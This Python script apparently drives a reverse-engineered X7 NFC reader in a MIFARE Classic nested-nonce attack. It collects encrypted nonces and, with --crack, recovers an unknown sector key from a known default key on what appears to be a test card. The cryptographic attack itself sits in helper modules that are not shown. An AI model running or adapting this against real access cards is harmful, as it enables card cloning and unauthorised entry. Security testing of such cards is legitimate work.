#!/usr/bin/env python3
"""Live nested-nonce calibration + key recovery for the X7 reader.

Reverse-engineered from nfcPro fcn.140033920 (nonce collector), fcn.14004ae20
(base CIU init), fcn.14004ab60 (register-poke dispatcher) and fcn.14004b140
(raw InCommunicateThru). The nested nonce is read over a PLAIN InCommunicateThru
of [60|kt, blk, CRC_A]; the X7 CIU enciphers the auth in HARDWARE once a known
sector is authenticated with InDataExchange. No software crypto1 on the wire.

Goal: recover a0b1c2d3e4f5 (block 3) from known block-7 key ffffffffffff,
card 01 02 03 04.

Run (X7 plugged in, MIFARE Classic on the antenna):
    python3 test_nested_live.py            # calibrate: dump raw nonce bytes
    python3 test_nested_live.py --crack    # full recovery (slow, ~minutes)
"""
import sys
from x7lib import X7Card


def calibrate(card):
    """STEP 1 of the bring-up: prove we now get 4 varying nonce bytes (not 2).
    Collect 8 raw nonces and print them; they MUST vary and be 4 bytes each."""
    info = card.wait_for_card()
    if not info:
        print("no card"); return
    print("card uid=%s sak=%02x" % (info["uid"].hex(), info["sak"]))
    print("collecting 8 nested nonces (known blk7=ffffffffffff -> target blk3)...")
    good = 0
    for i in range(8):
        nt_enc, par = card.collect_nested_nonce(
            known_blk=7, known_key="ffffffffffff", known_kt="A",
            target_blk=3, target_kt="A")
        if nt_enc is None:
            print("  [%d] None (truncated/abort) - check register setup" % i)
        else:
            print("  [%d] nt_enc=%08x par=%s" % (i, nt_enc, par))
            good += 1
    print("\n%d/8 full 4-byte nonces. PASS if >=2 distinct non-None values." % good)
    if good == 0:
        print("FAIL: still truncating. Probe registers 0x6300-0x633f after the "
              "InCommThru and find the one whose value varies (the FIFO/data port).")


def crack(card):
    """STEP 2: full key recovery. Returns the recovered key or None."""
    card.wait_for_card()
    print("uid=%s; recovering block-3 key from block-7 ffffffffffff..." % card.uid.hex())

    def prog(phase, n, x):
        print("  %s %s %s" % (phase, n, x))

    import x7crypto
    key = x7crypto.nested_recover_key(
        card, known_blk=7, known_key="ffffffffffff", target_blk=3,
        known_kt="A", target_kt="A",
        window=4096, max_samples=8, on_progress=prog)
    print("\nRECOVERED:", key, "(expected a0b1c2d3e4f5)" if key else "(FAILED)")
    return key


if __name__ == "__main__":
    card = X7Card()
    try:
        card.init_rf()
        if "--crack" in sys.argv:
            crack(card)
        else:
            calibrate(card)
    finally:
        card.close()
